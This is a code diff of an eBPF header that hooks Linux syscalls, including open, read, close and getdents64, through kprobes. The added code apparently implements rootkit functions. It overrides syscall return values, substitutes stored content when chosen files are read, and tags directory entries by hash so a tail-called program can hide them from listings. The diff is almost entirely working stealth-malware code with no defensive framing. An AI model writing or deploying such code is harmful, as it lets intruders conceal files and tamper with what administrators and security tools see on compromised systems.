@@ -8,141 +8,21 @@
 #ifndef _FS_ACTION_H_
 #define _FS_ACTION_H_
 
-struct bpf_map_def SEC("maps/fa_progs") fa_progs = {
-    .type = BPF_MAP_TYPE_PROG_ARRAY,
-    .key_size = sizeof(u32),
-    .value_size = sizeof(u32),
-    .max_entries = 20,
-};
-
-struct fa_action_t
+__attribute__((always_inline)) void fa_override_content(struct pt_regs *ctx, struct fa_fd_attr_t *fd_attr)
 {
-    u64 id;
-    s64 return_value;
-    u64 override_id;
-    u64 hidden_hash;
-};
+    struct fa_fd_content_key_t fd_content_key = {
+        .id = fd_attr->action.override_id,
+        .chunk = fd_attr->override_chunk,
+    };
 
-struct fa_fd_action_t
-{
-    u64 fd;
-    struct fa_action_t action;
-};
+    struct fa_fd_content_t *fd_content = (struct fa_fd_content_t *)bpf_map_lookup_elem(&fa_fd_contents, &fd_content_key);
+    if (fd_content)
+        bpf_override_return(ctx, fd_content->size);
+    else
+        bpf_override_return(ctx, 0);
 
-struct bpf_map_def SEC("maps/fa_fd_actions") fa_fd_actions = {
-    .type = BPF_MAP_TYPE_LRU_HASH,
-    .key_size = sizeof(u64),
-    .value_size = sizeof(struct fa_fd_action_t),
-    .max_entries = 4096,
-    .pinning = 0,
-    .namespace = "",
-};
-
-struct fa_fd_key_t
-{
-    u64 fd;
-    u32 pid;
-    u32 padding;
-};
-
-struct fa_fd_attr_t
-{
-    struct fa_action_t action;
-
-    u64 override_chunk;
-
-    void *read_buf;
-    u64 read_size;
-
-    u64 kmsg;
-};
-
-struct bpf_map_def SEC("maps/fa_fd_attrs") fa_fd_attrs = {
-    .type = BPF_MAP_TYPE_LRU_HASH,
-    .key_size = sizeof(struct fa_fd_key_t),
-    .value_size = sizeof(struct fa_fd_attr_t),
-    .max_entries = 4096,
-    .pinning = 0,
-    .namespace = "",
-};
-
-struct fa_path_key_t
-{
-    u64 hash;
-    u64 pos;
-};
-
-struct fa_path_attr_t
-{
-    u64 fs_hash;
-    u64 comm_hash;
-    struct fa_action_t action;
-};
-
-struct bpf_map_def SEC("maps/fa_path_attrs") fa_path_attrs = {
-    .type = BPF_MAP_TYPE_HASH,
-    .key_size = sizeof(struct fa_path_key_t),
-    .value_size = sizeof(struct fa_path_attr_t),
-    .max_entries = 4096,
-    .pinning = 0,
-    .namespace = "",
-};
-
-struct fa_fd_content_key_t
-{
-    u64 id;
-    u32 chunk;
-    u32 padding;
-};
-
-struct fa_fd_content_t
-{
-    u64 size;
-    char content[64];
-};
-
-struct bpf_map_def SEC("maps/fa_fd_contents") fa_fd_contents = {
-    .type = BPF_MAP_TYPE_HASH,
-    .key_size = sizeof(struct fa_fd_content_key_t),
-    .value_size = sizeof(struct fa_fd_content_t),
-    .max_entries = 4096,
-    .pinning = 0,
-    .namespace = "",
-};
-
-
-struct fa_getdents_t
-{
-    struct linux_dirent64 *dirent;
-    u64 hidden_hash;
-
-    u64 read;
-    u64 reclen;
-    void *src;
-};
-
-struct bpf_map_def SEC("maps/fa_getdents") fa_getdents = {
-    .type = BPF_MAP_TYPE_LRU_HASH,
-    .key_size = sizeof(u64),
-    .value_size = sizeof(struct fa_getdents_t),
-    .max_entries = 4096,
-    .pinning = 0,
-    .namespace = "",
-};
-
-struct fa_kmsg_t {
-    u64 size;
-    char str[100];
-};
-
-struct bpf_map_def SEC("maps/fa_kmsg") fa_kmsg = {
-    .type = BPF_MAP_TYPE_ARRAY,
-    .key_size = sizeof(u32),
-    .value_size = sizeof(struct fa_kmsg_t),
-    .max_entries = 30,
-    .pinning = 0,
-    .namespace = "",
-};
+    fd_attr->override_chunk++;
+}
 
 __attribute__((always_inline)) u64 get_fs_hash(struct dentry *dentry)
 {
@@ -167,7 +47,8 @@ __attribute__((always_inline)) u64 get_fs_hash(struct dentry *dentry)
     return hash;
 }
 
-__attribute__((always_inline)) int fa_path_attr_matches(struct fa_path_attr_t *path_attr, struct dentry *dentry) {    
+__attribute__((always_inline)) int fa_path_attr_matches(struct fa_path_attr_t *path_attr, struct dentry *dentry)
+{
     if (path_attr->fs_hash && path_attr->fs_hash != get_fs_hash(dentry))
         return 0;
 
@@ -176,7 +57,6 @@ __attribute__((always_inline)) int fa_path_attr_matches(struct fa_path_attr_t *p
 
     return 1;
 }
-
 
 __attribute__((always_inline)) struct fa_path_attr_t *get_path_attr(struct dentry *dentry)
 {
@@ -271,15 +151,13 @@ __attribute__((always_inline)) int fa_path_accessed(struct pt_regs *ctx)
     };
     bpf_map_update_elem(&fa_fd_attrs, &fd_key, &fd_attr, BPF_ANY);
 
-    if (fd_attr.action.id & FA_OVERRIDE_RETURN_ACTION) {
+    if (fd_attr.action.id & FA_OVERRIDE_RETURN_ACTION)
         bpf_override_return(ctx, fd_attr.action.return_value);
-        return 1;
-    } 
 
     return 0;
 }
 
-__attribute__((always_inline)) void fa_handle_close(int fd)
+__attribute__((always_inline)) int fa_handle_close(int fd)
 {
     u64 pid_tgid = bpf_get_current_pid_tgid();
 
@@ -292,6 +170,13 @@ __attribute__((always_inline)) void fa_handle_close(int fd)
     };
 
     bpf_map_delete_elem(&fa_fd_attrs, &fd_key);
+
+    return 0;
+}
+
+SYSCALL_KPROBE1(close, int, fd)
+{
+    return fa_handle_close(fd);
 }
 
 __attribute__((always_inline)) int fa_handle_unlink(struct pt_regs *ctx, const char *filename)
@@ -334,6 +219,16 @@ SYSCALL_KPROBE2(unlinkat, int, fd, const char *, filename)
     return fa_handle_unlink(ctx, filename);
 }
 
+SYSCALL_COMPAT_KRETPROBE(open)
+{
+    return fa_path_accessed(ctx);
+}
+
+SYSCALL_COMPAT_KRETPROBE(openat)
+{
+    return fa_path_accessed(ctx);
+}
+
 SEC("kprobe/vfs_open")
 int _vfs_open(struct pt_regs *ctx)
 {
@@ -368,6 +263,35 @@ SYSCALL_KRETPROBE(fstat)
     return fa_path_accessed(ctx);
 }
 
+SYSCALL_KPROBE2(read, int, fd, char *, buf)
+{
+    u64 pid_tgid = bpf_get_current_pid_tgid();
+    struct fa_fd_key_t fd_key = {
+        .fd = fd,
+        .pid = pid_tgid >> 32,
+    };
+
+    struct fa_fd_attr_t *fd_attr = (struct fa_fd_attr_t *)bpf_map_lookup_elem(&fa_fd_attrs, &fd_key);
+    if (!fd_attr)
+        return 0;
+
+    if (fd_attr->action.id & FA_OVERRIDE_RETURN_ACTION)
+    {
+        bpf_override_return(ctx, fd_attr->action.return_value);
+        return 0;
+    }
+
+    fd_attr->read_buf = buf;
+
+    struct fa_fd_action_t fd_action = {
+        .fd = fd,
+        .action = fd_attr->action,
+    };
+    bpf_map_update_elem(&fa_fd_actions, &pid_tgid, &fd_action, BPF_ANY);
+
+    return 0;
+}
+
 SEC("kretprobe/vfs_read")
 int _vfs_read(struct pt_regs *ctx)
 {
@@ -393,26 +317,10 @@ int _vfs_read(struct pt_regs *ctx)
     return 0;
 }
 
-__attribute__((always_inline)) void fa_override_content(struct pt_regs *ctx, struct fa_fd_attr_t *fd_attr)
-{
-    struct fa_fd_content_key_t fd_content_key = {
-        .id = fd_attr->action.override_id,
-        .chunk = fd_attr->override_chunk,
-    };
-
-    struct fa_fd_content_t *fd_content = (struct fa_fd_content_t *)bpf_map_lookup_elem(&fa_fd_contents, &fd_content_key);
-    if (fd_content)
-        bpf_override_return(ctx, fd_content->size);
-    else
-        bpf_override_return(ctx, 0);
-
-    fd_attr->override_chunk++;
-}
-
 __attribute__((always_inline)) int fa_handle_read_ret(struct pt_regs *ctx)
 {
     u64 pid_tgid = bpf_get_current_pid_tgid();
-    struct fa_fd_action_t *fd_action = (struct fa_fd_action_t *)bpf_map_lookup_elem(&fa_fd_actions, &pid_tgid);
+    struct fa_fd_action_t *fd_action = (struct fa_fd_action_t *)bpf_map_lookup_elem(&fa_fd_actions, &pid_tgid); 
     if (!fd_action)
         return 0;
 
@@ -435,8 +343,6 @@ __attribute__((always_inline)) int fa_handle_read_ret(struct pt_regs *ctx)
         }
         else
             fa_override_content(ctx, fd_attr);
-
-        return 1;
     }
     else if (fd_attr->action.id & FA_OVERRIDE_RETURN_ACTION)
     {
@@ -444,9 +350,55 @@ __attribute__((always_inline)) int fa_handle_read_ret(struct pt_regs *ctx)
 
         if (fd_attr->action.id & FA_KMSG_ACTION)
             fd_attr->action.id &= ~FA_OVERRIDE_RETURN_ACTION;
-
-        return 1;
     }
+
+    return 0;
+}
+
+SYSCALL_KRETPROBE(read)
+{
+    return fa_handle_read_ret(ctx);
+}
+
+SEC("kprobe/__x64_sys_getdents64")
+int __x64_sys_getdents64(struct pt_regs *ctx)
+{
+    ctx = (struct pt_regs *)PT_REGS_PARM1(ctx);
+
+    int fd;
+    bpf_probe_read(&fd, sizeof(fd), &PT_REGS_PARM1(ctx));
+
+    u64 pid_tgid = bpf_get_current_pid_tgid();
+    struct fa_fd_key_t fd_key = {
+        .fd = fd,
+        .pid = pid_tgid >> 32,
+    };
+
+    struct fa_fd_attr_t *fd_attr = (struct fa_fd_attr_t *)bpf_map_lookup_elem(&fa_fd_attrs, &fd_key);
+    if (!fd_attr)
+        return 0;
+
+    struct linux_dirent64 *dirent;
+    bpf_probe_read(&dirent, sizeof(dirent), &PT_REGS_PARM2(ctx));
+
+    struct fa_getdents_t getdents = {
+        .dirent = dirent,
+        .hidden_hash = fd_attr->action.hidden_hash,
+    };
+
+    bpf_map_update_elem(&fa_getdents, &pid_tgid, &getdents, BPF_ANY);
+
+    return 0;
+}
+
+SYSCALL_KRETPROBE(getdents64)
+{
+    u64 pid_tgid = bpf_get_current_pid_tgid();
+    struct fa_getdents_t *getdents = (struct fa_getdents_t *)bpf_map_lookup_elem(&fa_getdents, &pid_tgid);
+    if (!getdents)
+        return 0;
+
+    bpf_tail_call(ctx, &fa_progs, FA_OVERRIDE_GET_DENTS_PROG);
 
     return 0;
 }
